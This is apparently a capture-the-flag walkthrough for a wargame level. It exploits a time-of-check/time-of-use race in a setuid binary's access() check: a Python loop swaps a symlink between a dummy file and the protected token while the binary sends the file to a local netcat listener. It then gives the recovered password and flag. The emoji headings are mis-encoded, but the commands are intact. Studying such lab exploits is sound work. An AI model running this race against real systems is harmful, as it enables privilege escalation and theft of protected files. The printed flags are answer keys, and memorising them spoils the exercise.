ğŸ”» Analyze
â¬‡ï¸ ./level10 token http://localhost
â¬‡ï¸ ltrace ./level10 token http://localhost
ğŸ‘‰ access("token", 4)
â¬‡ï¸ man 2 access
ğŸ‘‰ NOTES ğŸŒŸ Warning:  Using  access() ...


ğŸ”» Network
ğŸŒŸ https://ru.wikipedia.org/wiki/Netcat
â¬‡ï¸ nc -lk 6969 > /tmp/output &

â¬‡ï¸ curl http://localhost:6969
â¬‡ï¸ ctrl+c
ğŸ‘‰ cat /tmp/output

â¬‡ï¸ echo token_test > /tmp/foo
â¬‡ï¸ ./level10 /tmp/foo 127.0.0.1
ğŸ‘‰ cat /tmp/output
â¹ kill %1


ğŸ”» Before hack
â¬‡ï¸ echo token_test > /tmp/foo
â¬‡ï¸ ln -sf /tmp/foo /tmp/sym
â¬‡ï¸ ls -la /tmp/sym

â¬‡ï¸ ln -sf /home/user/level10/token /tmp/sym
â¬‡ï¸ ls -la /tmp/sym

ğŸŒŸ python_one_line src: https://stackoverflow.com/a/35651859
â¬‡ï¸ python -c $'import os\nimport time\nwhile True:\n\tprint("ok")\n\ttime.sleep(1)\n'


ğŸ”» Hack
â¬‡ï¸ rm /tmp/output; nc -lk 6969 > /tmp/output &
â¬‡ï¸ echo token_test > /tmp/foo
â¬‡ï¸ python -c $'import os\nwhile True:\n\tos.system("ln -sf {} {}".format("/tmp/foo", "/tmp/sym"))\n\tos.system("ln -sf {} {}".format("/home/user/level10/token", "/tmp/sym"))' &
â¬‡ï¸ python -c $'import os\nfor _ in range(100):\n\tos.system("./level10 /tmp/sym 127.0.0.1")'
â¬‡ï¸ kill %1
â¬‡ï¸ kill %2
â¬‡ï¸ cat /tmp/output
ğŸ‘‰ woupa2yuojeeaaed06riuj63c
â¬‡ï¸ su flag10 â†ªï¸ woupa2yuojeeaaed06riuj63c
â¬‡ï¸ getflag
ğŸ‘‰ Check flag.Here is your token : feulo4b72j7edeahuete3no7c
